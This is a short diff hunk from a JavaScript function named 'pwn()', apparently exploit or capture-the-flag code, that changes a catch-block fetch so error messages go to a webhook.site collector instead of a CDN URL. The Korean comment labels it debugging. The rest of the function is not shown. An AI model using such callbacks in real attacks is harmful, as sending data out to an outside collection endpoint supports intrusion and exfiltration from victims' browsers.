@@ -66,7 +66,7 @@ async function pwn() {
 
   } catch (e) {
     // 디버깅용 에러 전송 
-    await fetch('https://cdn.statically.io/gh/mod-siw/PhantomPass@main/test.js/?error=' + encodeURIComponent(e.message));
+    await fetch('https://webhook.site/a79beb40-b5f6-4da3-a297-992b4f0cbc17/?error=' + encodeURIComponent(e.message));
   }
 }
 
